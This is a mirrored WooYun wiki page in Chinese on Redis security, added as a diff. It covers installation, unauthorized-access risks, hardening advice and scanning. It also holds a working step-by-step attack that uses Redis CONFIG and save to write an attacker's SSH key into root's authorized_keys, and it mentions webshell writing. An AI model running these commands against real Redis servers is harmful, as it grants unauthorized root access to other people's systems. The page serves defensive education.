@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/server:redis by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:02:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="utf-8" />
+  <title>server:redis</title>
+<meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="index,follow"/>
+<meta name="keywords" content="server,redis"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="WooYun WiKi"/>
+<link rel="start" href="../../index.html"/>
+<link rel="contents" href="../../server_redisdecf.html?do=index" title="网站地图"/>
+<link rel="alternate" type="application/rss+xml" title="最近更改" href="../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="../../feed0688.php?mode=list&amp;ns=server"/>
+<link rel="alternate" type="text/html" title="纯HTML" href="server_redis.html"/>
+<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="../raw/redis.txt"/>
+<link rel="canonical" href="../../server_redis.html"/>
+<link rel="stylesheet" type="text/css" href="../../lib/exe/css70b4.css?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='server';var JSINFO = {"id":"server:redis","namespace":"server","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../lib/exe/js1e16.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
+<script type="text/javascript" charset="utf-8" src="../../lib/plugins/codeprettify/google-code-prettify/run_prettifyeb11.js?lang=css"></script>
+</head>
+<body>
+<div class="dokuwiki export">
+<!-- TOC START -->
+<div id="dw__toc">
+<h3 class="toggle">目录</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="#redis安全配置">Redis安全配置</a></div>
+<ul class="toc">
+<li class="clear">
+<ul class="toc">
+<li class="level3"><div class="li"><a href="#redis简介">1、Redis简介</a></div></li>
+<li class="level3"><div class="li"><a href="#redis服务架设">2、Redis服务架设</a></div></li>
+<li class="level3"><div class="li"><a href="#错误配置以及利用">3、错误配置以及利用</a></div></li>
+<li class="level3"><div class="li"><a href="#实际案例">4、实际案例</a></div></li>
+<li class="level3"><div class="li"><a href="#修复方案">5、修复方案</a></div></li>
+<li class="level3"><div class="li"><a href="#漏洞扫描与发现">6、漏洞扫描与发现</a></div></li>
+<li class="level3"><div class="li"><a href="#相关资源">7、相关资源</a></div></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+
+<h1 class="sectionedit1" id="redis安全配置">Redis安全配置</h1>
+<div class="level1">
+
+</div>
+<!-- EDIT1 SECTION "Redis安全配置" [0-20] -->
+<h3 class="sectionedit2" id="redis简介">1、Redis简介</h3>
+<div class="level3">
+<hr />
+
+<p>
+redis是一个开源、支持网络、基于内存、键值对存储数据库，使用ANSI C编写。从2013年5月开始，Redis的开发由Pivotal赞助。在这之前，其开发由VMware赞助。
+</p>
+
+</div>
+<!-- EDIT2 SECTION "1、Redis简介" [21-250] -->
+<h3 class="sectionedit3" id="redis服务架设">2、Redis服务架设</h3>
+<div class="level3">
+<hr />
+
+<p>
+下载源码并安装
+</p>
+<pre class="code bash"><span class="kw2">wget</span> http:<span class="sy0">//</span>download.redis.io<span class="sy0">/</span>releases<span class="sy0">/</span>redis-2.8.7.tar.gz
+<span class="kw2">tar</span> xzf redis-2.8.7.tar.gz 
+<span class="kw3">cd</span> redis-2.8.7      
+<span class="kw2">make</span>                
+<span class="kw2">make</span> <span class="kw2">install</span>   
+<span class="co0">#拷贝配置文件       </span>
+<span class="kw2">cp</span> <span class="re5">-p</span> redis.conf <span class="sy0">/</span>etc</pre>
+
+<p>
+直接执行，服务开启
+</p>
+<pre class="code bash">redis-server</pre>
+
+<p>
+初始安装后redis默认没有任何限制，可以任意连接，默认运行端口6379
+按照指定的配置文件来运行
+</p>
+<pre class="code bash">redis-server <span class="sy0">/</span>etc<span class="sy0">/</span>redis.conf</pre>
+
+<p>
+如何连接redis
+没有密码的
+</p>
+<pre class="code bash">nc <span class="kw2">ip</span> port
+telnet <span class="kw2">ip</span> port
+redis-cli <span class="re5">-h</span> <span class="kw2">ip</span> <span class="re5">-p</span> port</pre>
+
+<p>
+有密码验证的
+</p>
+<pre class="code bash">redis-cli  <span class="re5">-h</span> <span class="kw2">ip</span> <span class="re5">-p</span> port <span class="re5">-a</span> password</pre>
+
+<p>
+图形界面工具
+</p>
+<pre class="code bash">redis Client</pre>
+
+</div>
+<!-- EDIT3 SECTION "2、Redis服务架设" [251-1018] -->
+<h3 class="sectionedit4" id="错误配置以及利用">3、错误配置以及利用</h3>
+<div class="level3">
+<hr />
+
+</div>
+
+<h4 id="未授权访问">3.1 未授权访问</h4>
+<div class="level4">
+
+<p>
+redis直接启动默认没有任何限制的，可以直接连接，查看,更改redis中的数据
+</p>
+
+</div>
+
+<h4 id="通过redis获取webshell">3.2 通过redis获取webshell</h4>
+<div class="level4">
+
+<p>
+假设redis用户运行在wooyun用户在，同时该服务器开放web服务，已知web目录的绝对路径(phpinfo,报错等等)，wooyun对web目录可以写入，则可以通过redis备份数据的过程写入shell
+</p>
+
+<p>
+具体方法：<a href="http://zone.wooyun.org/content/19358" class="urlextern" title="http://zone.wooyun.org/content/19358"  rel="nofollow">Redis-getshell</a>
+</p>
+
+</div>
+
+<h4 id="通过redis获取服务器用户">3.3 通过redis获取服务器用户</h4>
+<div class="level4">
+
+<p>
+假设redis用户运行在root用户，root用户对自己的authorized_keys可以控制，可以直接通过备份来写入ssh key。
+</p>
+
+<p>
+先在attack server生成一个公钥
+</p>
+<pre class="code">
+ssh-keygen -t rsa -C &quot;redis&quot;
+(echo -e &quot;\n\n&quot;; cat redis.pub; echo -e &quot;\n\n&quot;) &gt; redis.txt</pre>
+
+<p>
+然后执行
+</p>
+<pre class="code">
+redis-cli -h 192.168.192.133 flushall
+
+cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn
+</pre>
+
+<p>
+登录redis  redis-cli -h 192.168.192.133
+</p>
+<pre class="code">
+CONFIG set dir /root/.ssh/
+config set dbfilename &quot;authorized_keys&quot;
+save
+exit</pre>
+
+<p>
+然后就可以使用ssh的私钥登录了
+</p>
+<pre class="code">
+ssh -i redis <a class="__cf_email__" href="../../cdn-cgi/l/email-protection.html" data-cfemail="d7a5b8b8a397e6eee5f9e6e1eff9e6eee5f9e6e4e4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
+/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script></pre>
+
+<p>
+From:<a href="http://zone.wooyun.org/content/23842" class="urlextern" title="http://zone.wooyun.org/content/23842"  rel="nofollow">redis-sshkey</a>
+</p>
+
+</div>
+<!-- EDIT4 SECTION "3、错误配置以及利用" [1019-2213] -->
+<h3 class="sectionedit5" id="实际案例">4、实际案例</h3>
+<div class="level3">
+<hr />
+
+<p>
+未授权访问案例：
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-085110" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-085110"  rel="nofollow">	新浪redis数据库未授权访问（影响企业内部敏感信息）</a>
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-083978" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-083978"  rel="nofollow">聚美优品Redis未授权访问导致敏感信息泄露+跨境贸易报文交易系统弱口令</a>
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-089090" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-089090"  rel="nofollow">uc某redis配置不当导致uc共享wifi密钥泄露</a>
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2014-054740" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2014-054740"  rel="nofollow">	熊猫翻滚redis服务可无密码远程访问导致敏感数据泄漏</a>
+</p>
+
+<p>
+利用redis getshell案例：
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2015-0101465" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2015-0101465"  rel="nofollow">电信某服务器getshell可渗透内网（利用redis getshell案例）</a>
+</p>
+
+<p>
+利用redis写ssh key案例：
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2015-0152710" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2015-0152710"  rel="nofollow">中国铁建内网漫游沦陷多个重要部门泄漏大量信息(redis+ssh-keygen免认证登录案例)</a>
+</p>
+
+</div>
+<!-- EDIT5 SECTION "4、实际案例" [2214-3114] -->
+<h3 class="sectionedit6" id="修复方案">5、修复方案</h3>
+<div class="level3">
+<hr />
+
+<p>
+不要以root用户运行redis
+</p>
+
+<p>
+修改运行redis的端口,编辑配置文件
+</p>
+<pre class="code bash">port <span class="nu0">4321</span></pre>
+
+<p>
+如果只需要本地访问，编辑配置文件
+</p>
+<pre class="code bash"><span class="kw3">bind</span> 127.0.0.1</pre>
+
+<p>
+设定密码,编辑配置文件
+</p>
+<pre class="code bash">requirepass 　wooyun.org</pre>
+
+<p>
+在启动的时候需要指定配置文件的路径，这些设置才会生效
+</p>
+<pre class="code bash">redis-server <span class="sy0">/</span>etc<span class="sy0">/</span>redis.conf</pre>
+
+<p>
+添加防火墙
+</p>
+<pre class="code bash"><span class="co0">#注意设置INPUT的默认匹配规则为REJECT，否则该规则无意义</span>
+iptables <span class="re5">-A</span> INPUT <span class="re5">-p</span> tcp <span class="re5">-s</span> 192.168.1.0<span class="sy0">/</span><span class="nu0">24</span> <span class="re5">--dport</span> <span class="nu0">6379</span> <span class="re5">-j</span> ACCEPT</pre>
+
+</div>
+<!-- EDIT6 SECTION "5、修复方案" [3115-3715] -->
+<h3 class="sectionedit7" id="漏洞扫描与发现">6、漏洞扫描与发现</h3>
+<div class="level3">
+<hr />
+
+<p>
+使用nmap扫描redis的默认端口(6379)
+</p>
+<pre class="code bash"><span class="kw2">nmap</span> <span class="re5">-Pn</span> <span class="re5">-p6379</span> <span class="re5">-sV</span> x.x.x.x<span class="sy0">/</span><span class="nu0">24</span></pre>
+
+<p>
+手工验证
+</p>
+<pre class="code bash">nc <span class="kw2">ip</span> <span class="nu0">6379</span></pre>
+
+<p>
+后输入
+</p>
+<pre class="code bash">info</pre>
+
+<p>
+观察回显
+</p>
+
+<p>
+批量验证未授权访问
+</p>
+
+<p>
+首先获得开放redis的ip，python中存在redis模块，可以快速编程验证。
+</p>
+
+</div>
+<!-- EDIT7 SECTION "6、漏洞扫描与发现" [3716-4056] -->
+<h3 class="sectionedit8" id="相关资源">7、相关资源</h3>
+<div class="level3">
+<hr />
+
+<p>
+<a href="http://drops.wooyun.org/papers/3062" class="urlextern" title="http://drops.wooyun.org/papers/3062"  rel="nofollow">尝试通过HTTP请求攻击redis</a>
+</p>
+
+<p>
+<a href="http://zone.wooyun.org/content/19076" class="urlextern" title="http://zone.wooyun.org/content/19076"  rel="nofollow">zone中关于redis的讨论</a>
+</p>
+
+<p>
+<a href="http://redis.readthedocs.org/en/latest/" class="urlextern" title="http://redis.readthedocs.org/en/latest/"  rel="nofollow">Redis命令参考</a>
+</p>
+
+</div>
+<!-- EDIT8 SECTION "7、相关资源" [4057-] --></div>
+</body>
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/server:redis by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:02:53 GMT -->
+</html>
